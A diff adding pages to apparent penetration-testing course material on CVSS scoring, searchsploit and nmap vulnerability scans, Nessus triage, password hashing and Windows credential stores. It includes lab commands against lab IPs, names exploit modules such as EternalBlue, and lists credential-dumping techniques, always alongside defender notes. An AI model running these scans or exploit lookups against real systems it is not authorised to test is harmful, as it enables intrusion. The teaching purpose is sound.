+          <rect x="596" y="80" width="80" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="636" y="100" text-anchor="middle" font-size="11">I</text><text class="d-sub" x="636" y="116" text-anchor="middle">Integrity</text>
+          <rect x="688" y="80" width="80" height="44" rx="6" fill="#1f2533" stroke="#333b4c"/><text class="d-lbl" x="728" y="100" text-anchor="middle" font-size="11">A</text><text class="d-sub" x="728" y="116" text-anchor="middle">Availability</text>
+          <text class="d-sub" x="504" y="150">Each: None / Low / High</text>
+          <!-- score -->
+          <rect x="812" y="70" width="112" height="98" rx="10" fill="#1f2533" stroke="#fbbf24"/>
+          <text class="d-title" x="868" y="104" text-anchor="middle" font-size="22" fill="#fbbf24">8.1</text>
+          <text class="d-sub" x="868" y="126" text-anchor="middle">HIGH</text>
+          <text class="d-sub" x="868" y="146" text-anchor="middle">0–10 · banded</text>
+          <path d="M784,119 L810,119" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M456,119 L482,119" fill="none" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <!-- worked example vector -->
+          <text class="d-mono d-lbl" x="20" y="228" font-size="12">Worked example — EternalBlue (CVE-2017-0144, MS17-010, on your Win7 target):</text>
+          <rect x="20" y="240" width="904" height="30" rx="6" fill="#0d1218" stroke="#252b38"/>
+          <text class="d-mono" x="34" y="260" font-size="12.5" fill="#c9d1d9">CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H  →  8.1 HIGH</text>
+          <text class="d-sub" x="20" y="292">Read it: network-reachable (AV:N), no privileges or user click needed (PR:N/UI:N), full C/I/A loss. The AC:H (needs</text>
+          <text class="d-sub" x="20" y="308">a heap-grooming trick) is the only thing holding it under 9 — and Metasploit does that trick for you. A must-fix.</text>
+        </svg>
+        <figcaption><b>The vector is the actionable part.</b> Two vulns can both score 8.1; the one with <span class="mono">AV:N/PR:N/UI:N</span> is the one you reach from your Kali box without touching the victim's keyboard.</figcaption>
+      </figure>
+
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Score</th><th>0.0</th><th>0.1–3.9</th><th>4.0–6.9</th><th>7.0–8.9</th><th>9.0–10.0</th></tr></thead>
+        <tbody><tr><td><strong>Severity</strong></td><td>None</td><td>Low</td><td>Medium</td><td>High</td><td>Critical</td></tr></tbody>
+      </table>
+      </div>
+
+      <div class="box tip">
+        <span class="box-t">Currency — CVSS v3.1 vs v4.0 (verify, don't memorise)</span>
+        <p><strong>CVSS v4.0 shipped November 2023</strong>, but most CVEs you meet — and the NVD — still lead with a
+           <strong>v3.1</strong> score, and CEH 312-50v12 is written to v3.x. v4.0 reworked the vector: it split impact
+           into <em>Vulnerable System</em> (VC/VI/VA) and <em>Subsequent System</em> (SC/SI/SA), added <em>Attack
+           Requirements</em> (AT), and dropped the old <em>Scope</em>. The lesson is the habit, not the letters:
+           <strong>check which version a score is in before you compare two of them</strong> — an 8.1 v3.1 and an 8.1
+           v4.0 are not the same measurement.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P6 · SEARCHSPLOIT + NMAP VULN  ========== -->
+  <section class="page" data-title="searchsploit &amp; nmap --script vuln">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P06</span><span class="tag theory">Tool group · attacker + defender</span><span class="time">⏱ 7 min</span></div>
+      <h1>Does a Public Exploit Exist?</h1>
+      <p class="lede">Two tools answer the funnel's hardest stage — one offline and silent, one on the wire and loud.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why these two, here</span>
+        <p>You have a version and maybe a CVE. Before you write "way in" in the access plan you need to know a working
+           exploit exists. <span class="mono">searchsploit</span> checks a local copy of Exploit-DB in a second;
+           <span class="mono">nmap --script vuln</span> asks the target itself. The pair teaches a real distinction:
+           <strong>research leaves no trace; checking the target does.</strong></p>
+      </div>
+
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 170" role="img" aria-label="searchsploit queries a local offline database and leaves no trace on the target; nmap script vuln asks the target directly and is logged. Click each.">
+          <g class="node" data-node="ss" tabindex="0">
+            <rect x="30" y="40" width="380" height="90" rx="10" fill="#1a1f2a" stroke="#4ade80"/>
+            <text class="d-title" x="220" y="72" text-anchor="middle" font-size="13" fill="#4ade80">searchsploit — offline</text>
+            <text class="d-sub" x="220" y="94" text-anchor="middle">a local database query</text>
+            <text class="d-sub" x="220" y="112" text-anchor="middle" class="d-mono" fill="#4ade80">SOC sees: nothing</text>
+          </g>
+          <g class="node" data-node="nv" tabindex="0">
+            <rect x="530" y="40" width="380" height="90" rx="10" fill="#1a1f2a" stroke="#ff7043"/>
+            <text class="d-title" x="720" y="72" text-anchor="middle" font-size="13" fill="#ff7043">nmap --script vuln — on the wire</text>
+            <text class="d-sub" x="720" y="94" text-anchor="middle">asks the target directly</text>
+            <text class="d-sub" x="720" y="112" text-anchor="middle" class="d-mono" fill="#ff7043">SOC sees: probes, 5156, IDS</text>
+          </g>
+          <text class="d-sub" x="470" y="90" text-anchor="middle">vs</text>
+        </svg>
+        <div class="dgm-hint">Click each — the same question, opposite visibility.</div>
+        <div class="dgm-detail" data-detail="ss"><h5><span class="dd-tag">SILENT</span>Research is invisible</h5><p><b>searchsploit reads a local copy of Exploit-DB.</b> No packet leaves your box, so nothing is logged anywhere — you can research a target's every version all day and the defender never knows. This is why detection can't start until you touch the target.</p></div>
+        <div class="dgm-detail" data-detail="nv"><h5><span class="dd-tag">LOUD</span>Asking the target is an event</h5><p><b>nmap --script vuln sends real, often malformed probes.</b> The service logs the connections (WFP 5156, service logs) and IDS rules fire on the known script signatures. The instant "is this known?" becomes "is <em>this host</em> vulnerable?", it's detectable — map it to T1595 Active Scanning.</p></div>
+      </figure>
+
+      <h2 class="mono" style="color:#ff7043">searchsploit — the 7-part frame</h2>
+      <div class="tbl-scroll">
+      <table>
+        <tbody>
+          <tr><td style="width:150px"><strong>What it is</strong></td><td>A command-line search over a local, offline copy of the Exploit-DB archive (ships in Kali as <span class="mono">exploitdb</span>).</td></tr>
+          <tr><td><strong>Why it exists</strong></td><td>To answer "is there a public exploit for this?" in seconds, offline, without browsing to a website or tipping anyone off.</td></tr>
+          <tr><td><strong>The method</strong></td><td>Search by product <em>and</em> version, read the titles for a match to your exact version and platform, then read the exploit before trusting it. Broad first, then narrow — and mirror the copy (<span class="mono">-m</span>) so you have it locally.</td></tr>
+          <tr><td><strong>Real syntax</strong></td><td><pre><code>searchsploit vsftpd 2.3.4
+searchsploit samba 3.0.20
+searchsploit -m unix/remote/16320.rb    # mirror a copy locally
+searchsploit --nmap scan.xml            # feed it an nmap -oX result</code></pre></td></tr>
+          <tr><td><strong>Read the output</strong></td><td><pre><code>------------------------------------------- ---------------------------------
+ Exploit Title                             |  Path
+------------------------------------------- ---------------------------------
+vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/49757.py
+vsftpd 2.3.4 - Backdoor Command Execution  | unix/remote/17491.rb (Metasploit)
+------------------------------------------- ---------------------------------</code></pre>A hit named for your exact version + "(Metasploit)" is gold — a reliable module exists. No hit ≠ "safe"; it means no <em>public</em> exploit here.</td></tr>
+          <tr><td><strong>What it feeds</strong></td><td>The "public exploit? yes/no + reference" column of your access plan — and Session 5's exploitation.</td></tr>
+          <tr><td><strong>SOC flip</strong></td><td><span style="color:#4ade80">Nothing.</span> searchsploit is a local database query — it never touches the target, so there is <em>no</em> log on the defender side. Attacker research is invisible; that's exactly why detection has to start at the next step.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2 class="mono" style="color:#ff7043">nmap --script vuln — the target answers</h2>
+      <p>The NSE <span class="mono">vuln</span> category asks the service directly whether it is vulnerable — the fast
+         way to turn a port into a confirmed CVE without a full scanner.</p>
+      <pre><code>nmap -sV --script vuln 192.168.56.X                     # broad — all vuln scripts
+nmap -p445 --script smb-vuln-ms17-010 192.168.56.107   # targeted — is Win7 EternalBlue-vulnerable?
+
+# realistic output on the Windows 7 target:
+| smb-vuln-ms17-010:
+|   VULNERABLE:
+|   Remote Code Execution vulnerability in Microsoft SMBv1 (ms17-010)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2017-0143</code></pre>
+
+      <div class="box defender-view">
+        <span class="box-t">SOC flip — this one is loud</span>
+        <p>Unlike searchsploit, <span class="mono">--script vuln</span> sends real, often malformed probes at the
+           service. The target logs the connections (Windows Filtering Platform <span class="mono">5156</span>, service
+           logs), and an IDS flags the vuln-script signatures outright — Suricata/Snort rules exist for exactly these
+           probes. <b>Attacker ↔ defender:</b> the moment research becomes a question asked <em>of the target</em>, it
+           becomes an event the SOC can see. Map it to <span class="mono">T1595 Active Scanning</span>.</p>
+      </div>
+
+      <div class="box warn">
+        <span class="box-t">Metasploitable2 is a 2012 time capsule</span>
+        <p>Its CVEs (<span class="mono">vsftpd 2.3.4</span>, <span class="mono">Samba</span>, <span class="mono">UnrealIRCd</span>)
+           are <em>perfect</em> for practising CVE→exploit matching because they have clean, reliable public exploits.
+           They are <em>useless</em> as a picture of a modern vulnerability landscape — nothing in production has looked
+           like this since 2012. Practise the method here; don't generalise the findings.</p>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P7 · LAB 1 — VERSION TO EXPLOIT  ========== -->
+  <section class="page" data-title="Lab 1: version → CVE → exploit?">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P07</span><span class="tag lab">Hands-on · everyone</span><span class="time">⏱ 16 min</span></div>
+      <h1>Lab 1 — Turn Your Version Strings Into Ways In</h1>
+      <p class="lede">Take the exact versions from your target profile and run each through the funnel: CVE → CVSS →
+         does a public exploit exist?</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">What you are about to do</span>
+        <p>No new scanning — you already have the versions. This lab is disciplined lookup: for each interesting service,
+           find the CVE, note the CVSS, and answer the yes/no that matters — <em>is there a working public exploit?</em>
+           You build the "way in" column of your access plan. You do <strong>not</strong> fire anything.</p>
+      </div>
+
+      <h2>Step 1 — searchsploit your profile (Metasploitable2)</h2>
+      <ol class="steps">
+        <li>
+          <strong>Search each version you enumerated</strong>, exact product + version.
+          <pre><code>searchsploit vsftpd 2.3.4         # → Backdoor Command Execution (Metasploit)
+searchsploit samba 3.0.20         # → usermap_script (Metasploit) — CVE-2007-2447
+searchsploit unrealircd 3.2.8.1   # → Backdoor Command Execution — CVE-2010-2075
+searchsploit -m unix/remote/16320.rb   # mirror the Samba one to read it</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>Each service returns at least one title matching its <strong>exact</strong> version</li>
+              <li>You can name which hits are <span class="mono">(Metasploit)</span> = a reliable module exists</li>
+              <li>You mirrored one exploit and read its header — target, requirements, what it does</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 2 — ask the Windows 7 target directly (the CVE→exploit bridge)</h2>
+      <ol class="steps">
+        <li>
+          <strong>Confirm MS17-010 with NSE</strong> — this is the one CVE you'll actually fire in Session 5.
+          <pre><code>nmap -p445 --script smb-vuln-ms17-010 192.168.56.107
+# VULNERABLE:  ... (ms17-010)  IDs: CVE:CVE-2017-0143
+# CVSS 8.1 High · public exploit: YES (Metasploit exploit/windows/smb/ms17_010_eternalblue)</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>The script reports <span class="mono">VULNERABLE</span> and prints a CVE</li>
+              <li>You recorded: CVE, CVSS 8.1, <strong>public exploit: yes</strong> — this line is the Session 5 target</li>
+              <li>You noted this probe <em>is</em> logged on the target (unlike the searchsploit lookups)</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 3 — the practice range (read versions as leads)</h2>
+      <ol class="steps">
+        <li>
+          <strong>On Kioptrix 1</strong>, the old versions <em>are</em> the exploit map — practise reading them.
+          <pre><code>searchsploit mod_ssl 2.8.4     # → OpenFuck / OpenLuck — CVE-2002-0082
+searchsploit samba 2.2         # → trans2open remote overflow
+# both have public exploits — record them, don't run them here</code></pre>
+          <div class="verify">
+            <h4>✓ Verification</h4>
+            <ul>
+              <li>You matched <span class="mono">mod_ssl 2.8.4</span> → OpenFuck (CVE-2002-0082) and Samba 2.2.1a → trans2open</li>
+              <li>You can state, for each, whether a public exploit exists</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <h2>Step 4 — the deliberate failure case</h2>
+      <div class="box warn">
+        <span class="box-t">A hit is not a guarantee — read before you believe</span>
+        <p>Search <span class="mono">samba 3.0.20</span> and you'll see several exploits. Now check the version on
+           <strong>Windows 10</strong>: <span class="mono">searchsploit "windows 10"</span> returns pages of results,
+           almost none of which apply to a patched build. <b>The lesson:</b> a searchsploit hit is a <em>lead</em>, not a
+           finding. You confirm it by matching the exact version and reading the exploit's requirements — the wrong
+           version or a patched target makes a "critical" a dead end. Record confidence, not hope.</p>
+      </div>
+
+      <div class="box key-takeaway">
+        <span class="box-t">What you produced</span>
+        <p>A per-host list: for each interesting service — CVE, CVSS base score, and <strong>public exploit:
+           yes/no + reference</strong>. That is the entire left half of your access plan. Metasploitable2 and Win7 will
+           have clean "yes" lines; Windows 10 should be mostly "no public exploit for this build" — which is itself a
+           finding (it's patched).</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P8 · AUTOMATED SCANNING TOOLS  ========== -->
+  <section class="page" data-title="Automated vuln scanning">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P08</span><span class="tag theory">Tool group · attacker + defender</span><span class="time">⏱ 7 min</span></div>
+      <h1>Automated Scanning — Nessus &amp; Greenbone</h1>
+      <p class="lede">Manual lookup doesn't scale to a /24. Automated scanners do the version→CVE→CVSS mapping across a
+         whole network — and hand you a pile of findings you still have to judge.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this follows manual analysis</span>
+        <p>You just did by hand what a scanner does at scale: match versions to CVEs and score them. Learn the manual
+           method <em>first</em> so that when a scanner hands you 300 findings, you can tell the real ones from the noise
+           — because a scanner's confidence is not proof.</p>
+      </div>
+
+      <figure class="dgm interactive">
+        <svg viewBox="0 0 940 170" role="img" aria-label="A scanner's raw findings narrow through confirmed, then reachable, to the few real ways in. Click each stage.">
+          <g class="node" data-node="raw" tabindex="0"><rect x="16" y="55" width="200" height="60" rx="9" fill="#1a1f2a" stroke="#fbbf24"/><text class="d-title" x="116" y="82" text-anchor="middle" font-size="12.5">Raw findings</text><text class="d-sub" x="116" y="100" text-anchor="middle">dozens–hundreds</text></g>
+          <g class="node" data-node="conf" tabindex="0"><rect x="266" y="62" width="180" height="46" rx="9" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="356" y="82" text-anchor="middle" font-size="12">Confirmed</text><text class="d-sub" x="356" y="99" text-anchor="middle">real version</text></g>
+          <g class="node" data-node="reach" tabindex="0"><rect x="496" y="66" width="170" height="38" rx="9" fill="#1a1f2a" stroke="#ff7043"/><text class="d-title" x="581" y="90" text-anchor="middle" font-size="12">Reachable</text></g>
+          <g class="node" data-node="wayin" tabindex="0"><rect x="716" y="68" width="150" height="34" rx="9" fill="#1f2533" stroke="#4ade80"/><text class="d-title" x="791" y="90" text-anchor="middle" font-size="12" fill="#4ade80">Ways in</text></g>
+          <path d="M216,85 L264,85" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M446,85 L494,85" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+          <path d="M666,85 L714,85" stroke="#768290" stroke-width="1.5" marker-end="url(#ar-g)"/>
+        </svg>
+        <div class="dgm-hint">Click each stage — this narrowing is the triage job the tool can't do.</div>
+        <div class="dgm-detail" data-detail="raw"><h5><span class="dd-tag">STAGE 1</span>Raw findings</h5><p><b>What the scanner hands you</b> — every banner-matched CVE, sorted by its own confidence. Includes false positives (version mismatches) and criticals you can't reach. This is a to-do list, not a conclusion.</p></div>
+        <div class="dgm-detail" data-detail="conf"><h5><span class="dd-tag">STAGE 2</span>Confirmed</h5><p><b>You checked the real version by hand</b> (nxc, netcat, the actual build). Drops the false positives where the scanner matched a banner that doesn't actually carry the flaw. This is where a "critical" often dies.</p></div>
+        <div class="dgm-detail" data-detail="reach"><h5><span class="dd-tag">STAGE 3</span>Reachable</h5><p><b>Can you actually trigger it from where you are?</b> Read the CVSS vector — an <span class="mono">AV:N/PR:N</span> beats a 9.8 that needs local access you don't have. Priority for the client ≠ priority for your foothold.</p></div>
+        <div class="dgm-detail" data-detail="wayin"><h5><span class="dd-tag">STAGE 4</span>Ways in</h5><p><b>The handful that are real, reachable, and have a working exploit.</b> These go in the access plan. A scanner rarely surfaces these at the top — the judgement that finds them is the skill you're being paid for.</p></div>
+      </figure>
+
+      <h2 class="mono" style="color:#ff7043">Nessus Essentials — the 7-part frame</h2>
+      <div class="tbl-scroll">
+      <table>
+        <tbody>
+          <tr><td style="width:150px"><strong>What it is</strong></td><td>Tenable's vulnerability scanner. <strong>Nessus Essentials</strong> is the free tier — the industry-standard tool you'll meet on the job.</td></tr>
+          <tr><td><strong>Why it exists</strong></td><td>To scan a network, fingerprint every service, map each to known CVEs via a huge plugin feed, score them, and produce a remediation report — in one pass.</td></tr>
+          <tr><td><strong>The method</strong></td><td>Point it at authorised targets, pick a policy (Basic Network Scan), let the plugins run, then <em>triage</em>: sort by severity, confirm the criticals by hand, discard the false positives. The scan is 20% of the work; the triage is 80%.</td></tr>
+          <tr><td><strong>Real syntax</strong></td><td>Web UI at <span class="mono">https://localhost:8834</span>. New Scan → Basic Network Scan → targets <span class="mono">192.168.56.102,107,20,10</span> → Launch → read the colour-coded results.</td></tr>
+          <tr><td><strong>Read the output</strong></td><td>Findings by severity (Critical→Info), each with CVE, CVSS, a plugin description, and remediation. Read the <em>plugin output</em> — it shows the evidence, which is how you spot a false positive.</td></tr>
+          <tr><td><strong>What it feeds</strong></td><td>The vulnerability section of an assessment report — and, filtered to what's real and reachable, the access plan.</td></tr>
+          <tr><td><strong>SOC flip</strong></td><td><span style="color:#4ade80">Extremely loud.</span> A full scan hits every port on every host and throws malformed probes — it lights up IDS, WFP (5156), and every service log. On a monitored network a Nessus scan you didn't announce generates an incident. Authorised scans are scheduled and whitelisted for exactly this reason.</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="box tip">
+        <span class="box-t">Currency — Nessus Essentials is now <strong>5 IPs</strong>, not 16</span>
+        <p>Older courseware (and the "Nessus Home" name) says 16 hosts. As of 2026 the free <strong>Nessus
+           Essentials</strong> tier scans <strong>5 IPs</strong> — enough for our four lab targets (MSF2 · Win7 · Win10 ·
+           DC) if you leave Kali out. Tenable also sells a paid "Essentials Plus" at 20 IPs. The plugin download is
+           large — do it <em>before</em> class. This is the standing habit: <strong>verify a tool's current limits before
+           you quote them.</strong></p>
+      </div>
+
+      <h2 class="mono" style="color:#ff7043">Greenbone / GVM — the FOSS alternative</h2>
+      <p>The open-source option. Note the naming correction: <strong>"OpenVAS" is now the scanner engine inside the
+         Greenbone Vulnerability Management (GVM) framework</strong> — the product is Greenbone/GVM, OpenVAS is a
+         component of it.</p>
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th></th><th>Nessus Essentials</th><th>Greenbone / GVM</th></tr></thead>
+        <tbody>
+          <tr><td>Licence</td><td>Free tier, 5 IPs</td><td>Fully open source, no IP cap</td></tr>
+          <tr><td>Feed</td><td>Large plugin download (do it early)</td><td>Community feed — <strong>slow</strong> initial sync (can be hours)</td></tr>
+          <tr><td>Weight</td><td>Installs on Kali or a host; moderate</td><td>Heavier; often its own light VM</td></tr>
+          <tr><td>On the job</td><td>The commercial standard you'll be handed</td><td>The budget / open-source shop's choice</td></tr>
+          <tr><td>Practice room</td><td>THM <span class="mono">nessus</span> (private)</td><td>THM <span class="mono">openvas</span> (<span style="color:#4ade80">free</span>)</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <div class="box note">
+        <span class="box-t">In class this is a guided demo, not a per-student run</span>
+        <p>Every student downloading a plugin feed and scanning is not worth the class minutes. Watch one scan, learn to
+           <em>read</em> a result and question a "critical," then move on. The manual method (Lab 1) is the skill; the
+           scanner is the scale.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P9 · LAB 2 — SCAN DEMO + FALSE POSITIVE  ========== -->
+  <section class="page" data-title="Lab 2: the scan &amp; its false positive">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P09</span><span class="tag lab">Hands-on demo · everyone reads</span><span class="time">⏱ 8 min</span></div>
+      <h1>Lab 2 — Read a Scan, Distrust a "Critical"</h1>
+      <p class="lede">A guided scan of the lab, then the skill that actually matters: telling a real critical from a
+         scanner's false positive.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">What this demo shows</span>
+        <p>This block is a guided demo — one Nessus (or Greenbone) scan of the four lab targets, watched and read
+           together. The point isn't launching a scan; it's learning to triage one, because the report you're handed on
+           the job is only as good as your ability to question it.</p>
+      </div>
+
+      <h2>Follow along</h2>
+      <ol class="steps">
+        <li>
+          <strong>Watch the scan run</strong> and note the shape of the output.
+          <pre><code># Nessus:   New Scan → Basic Network Scan → 192.168.56.102,107,20,10 → Launch
+# Greenbone: Scans → Tasks → New Task → target the same four → Start
+# Metasploitable2 lights up red; Win10 comes back nearly clean (it's patched)</code></pre>
+          <div class="verify">
+            <h4>✓ Verification — you can read the result</h4>
+            <ul>
+              <li>You can name the <strong>most-vulnerable host</strong> (MSF2) and the <strong>cleanest</strong> (Win10) from the colour bands</li>
+              <li>You can open one Critical and find its <strong>CVE, CVSS, and plugin output</strong> (the evidence)</li>
+            </ul>
+          </div>
+        </li>
+        <li>
+          <strong>Find the false positive.</strong> Pick a "Critical" and confirm it by hand against the actual version.
+          <pre><code># scanner says: "Critical — Samba badlock (CVE-2016-2118)"
+# confirm the real version yourself:
+nxc smb 192.168.56.102        # Samba 3.0.20 — predates the reported issue / not the real risk here
+# the reachable, proven way in on this box is usermap_script (CVE-2007-2447), which you found in Lab 1</code></pre>
+          <div class="verify">
+            <h4>✓ Verification — you distrusted the tool</h4>
+            <ul>
+              <li>You picked one "critical," checked the real version, and judged whether it's <strong>reachable and real</strong> or a version-match false positive</li>
+              <li>You can state why a scanner over-reports: it matches banners, not proven exploitability</li>
+            </ul>
+          </div>
+        </li>
+      </ol>
+
+      <div class="box defender-view">
+        <span class="box-t">SOC flip — the scan you're watching is an incident elsewhere</span>
+        <p>On a monitored network this exact scan trips the IDS and fills the WFP log (<span class="mono">5156</span>)
+           with one source touching every port on every host — the same one-to-many signature you wrote a rule for in
+           Session 3. Authorised vuln scans are announced and whitelisted precisely so the SOC doesn't chase them. An
+           <em>un</em>announced Nessus scan is a red-team indicator.</p>
+      </div>
+
+      <div class="box key-takeaway">
+        <span class="box-t">The one thing</span>
+        <p>A scanner finds candidates; <strong>you</strong> confirm findings. "Critical" is the tool's confidence, not
+           proof — a version-match false positive wastes a client's time and a real reachable medium can matter more than
+           an unreachable critical. The judgement is the job the tool can't do.</p>
+      </div>
+    </div>
+  </section>
+  <!-- ==========  P10 · AUTH CONCEPTS + HASHING  ========== -->
+  <section class="page" data-title="Authentication &amp; hashing">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P10</span><span class="tag theory">Method · the mechanism first</span><span class="time">⏱ 9 min</span></div>
+      <h1>What a Credential Really Is</h1>
+      <p class="lede">Before a single tool: authentication, and why a hash can be cracked even though it can't be
+         reversed. Get this and every attack today is obvious.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why the mechanism comes before the tools</span>
+        <p>A student who runs <span class="mono">hashcat -m 1000</span> has learned nothing. A student who can explain
+           what an NTLM hash is, why it's crackable offline, and why spraying beats brute-force against a lockout policy
+           has learned authentication. So we build the mechanism first, then hang the tools on it.</p>
+      </div>
+
+      <h2>Authentication in one line</h2>
+      <p>Authentication is proving you are who you claim to be — with something you know (password), have (token, key),
+         or are (biometric). Passwords are the weak link, and the rule is universal: <strong>passwords are stored
+         hashed, never in plaintext.</strong> Everything today is about getting at, or abusing, those stored or
+         in-transit secrets.</p>
+
+      <h2>Hashing vs encryption vs encoding</h2>
+      <p>Students conflate these constantly, and the whole session depends on the difference.</p>
+
+      <figure class="dgm">
+        <svg viewBox="0 0 940 250" role="img" aria-label="Encoding is reversible with no key; encryption is reversible with a key; hashing is one-way with no key, which is why a hash is guessed rather than reversed.">
+          <!-- encoding -->
+          <rect x="16" y="40" width="290" height="180" rx="10" fill="#1a1f2a" stroke="#768290"/>
+          <text class="d-title" x="36" y="66" font-size="13">Encoding</text>
+          <text class="d-sub" x="36" y="86">Base64, URL, hex</text>
+          <text class="d-lbl" x="36" y="118" font-size="11.5">Purpose: safe transport,</text>
+          <text class="d-lbl" x="36" y="135" font-size="11.5">not secrecy</text>
+          <text class="d-mono" x="36" y="168" font-size="11" fill="#22d3ee">reversible · NO key</text>
+          <text class="d-sub" x="36" y="196">Anyone can decode. Not security.</text>
+          <!-- encryption -->
+          <rect x="326" y="40" width="290" height="180" rx="10" fill="#1a1f2a" stroke="#22d3ee"/>
+          <text class="d-title" x="346" y="66" font-size="13">Encryption</text>
+          <text class="d-sub" x="346" y="86">AES, RSA</text>
+          <text class="d-lbl" x="346" y="118" font-size="11.5">Purpose: confidentiality,</text>
+          <text class="d-lbl" x="346" y="135" font-size="11.5">meant to be undone</text>
+          <text class="d-mono" x="346" y="168" font-size="11" fill="#22d3ee">reversible · WITH a key</text>
+          <text class="d-sub" x="346" y="196">Hold the key → get plaintext back.</text>
+          <!-- hashing -->
+          <rect x="636" y="40" width="288" height="180" rx="10" fill="#1a1f2a" stroke="#ff7043"/>
+          <text class="d-title" x="656" y="66" font-size="13" fill="#ff7043">Hashing</text>
+          <text class="d-sub" x="656" y="86">MD5, SHA-256, NTLM</text>
+          <text class="d-lbl" x="656" y="118" font-size="11.5">Purpose: verify without</text>
+          <text class="d-lbl" x="656" y="135" font-size="11.5">storing the secret</text>
+          <text class="d-mono" x="656" y="168" font-size="11" fill="#ff7043">one-way · NO key</text>
+          <text class="d-sub" x="656" y="196">Cannot be reversed — only guessed.</text>
+        </svg>
+        <figcaption><b>Only one of these is one-way.</b> A hash can't be "decrypted" because there's no key and no inverse
+           function. So attackers don't reverse it — they <em>guess</em> inputs, hash each guess, and compare.</figcaption>
+      </figure>
+
+      <div class="box attacker-view">
+        <span class="box-t">Why a hash is crackable</span>
+        <p>You never reverse a hash. You take a wordlist, hash every candidate with the <em>same</em> algorithm, and
+           compare to the target. A match means you found the input. That's why <strong>weak or common passwords fall in
+           seconds</strong> (they're in the wordlist) and long random ones don't (they aren't). "Cracking" is
+           guessing at scale — nothing more.</p>
+      </div>
+
+      <div class="box defender-view">
+        <span class="box-t">Salting — why it matters to the defender</span>
+        <p>A <strong>salt</strong> is random data added before hashing, so two users with the same password get different
+           hashes. It defeats <em>rainbow tables</em> (pre-computed hash→password lookups) and stops one crack from
+           revealing every reused password. <b>NTLM has no salt</b> — which is exactly why Windows hashes are so
+           attractive to an attacker and why NTLM is on its way out.</p>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==========  P11 · WHERE CREDS LIVE + NTLM (ANIMATED)  ========== -->
+  <section class="page" data-title="NTLM challenge-response">
+    <div class="page-head">
+      <div class="kicker"><span class="snum">S04 · P11</span><span class="tag theory">Method · animated</span><span class="time">⏱ 10 min</span></div>
+      <h1>Where Credentials Live, and What Crosses the Wire</h1>
+      <p class="lede">Three stores hold Windows secrets, and NTLM's challenge-response decides what an attacker on the
+         network can actually grab.</p>
+    </div>
+    <div class="content">
+
+      <div class="box intro">
+        <span class="box-t">Why this is the pivot of the session</span>
+        <p>Every credential attack today targets one of these stores or the traffic between them. Knowing <em>where</em>
+           a secret lives tells you <em>which</em> attack applies — SAM cracking, LSASS dumping, NTDS extraction, or
+           capturing a challenge-response off the wire.</p>
+      </div>
+
+      <h2>Where Windows credentials live</h2>
+      <div class="tbl-scroll">
+      <table>
+        <thead><tr><th>Store</th><th>Holds</th><th>Attack (ATT&amp;CK)</th><th>Today</th></tr></thead>
+        <tbody>
+          <tr><td><span class="mono">SAM</span> (local)</td><td>Local account NT hashes, per machine</td><td>SAM dumping — T1003.002</td><td>Lab 3</td></tr>
+          <tr><td><span class="mono">LSASS</span> (memory)</td><td>Hashes + tickets of logged-on users, live</td><td>LSASS dump (mimikatz) — T1003.001</td><td>intro (full in S6)</td></tr>
+          <tr><td><span class="mono">NTDS.dit</span> (DC)</td><td><em>Every</em> domain account's hash</td><td>NTDS extraction — T1003.003</td><td>Lab 6 (secretsdump)</td></tr>
+          <tr><td>The wire</td><td>NTLM challenge-response (NetNTLMv2)</td><td>Poisoning / relay — T1557.001</td><td>Lab 5</td></tr>
+        </tbody>
+      </table>
+      </div>
+
+      <h2>NTLM challenge-response — press play</h2>
+      <p>NTLM authenticates without sending the password <em>or</em> the NT hash across the network. Watch what actually
+         travels — because that's what Responder captures.</p>
+
+      <figure class="dgm animate-run">
+        <svg viewBox="0 0 940 330" role="img" aria-label="NTLM challenge-response: client negotiates, server sends a challenge, client returns a response computed from its NT hash; the attacker who answers the client's name lookup captures that response, called NetNTLMv2, not the NT hash itself.">
+          <!-- actors -->
+          <rect x="40" y="40" width="150" height="52" rx="8" fill="#1f2533" stroke="#22d3ee"/>
+          <text class="d-title" x="115" y="64" text-anchor="middle" font-size="12.5">Client</text>
+          <text class="d-sub" x="115" y="82" text-anchor="middle">has the NT hash</text>
+          <rect x="750" y="40" width="150" height="52" rx="8" fill="#1f2533" stroke="#4ade80"/>
+          <text class="d-title" x="825" y="64" text-anchor="middle" font-size="12.5">Server / DC</text>
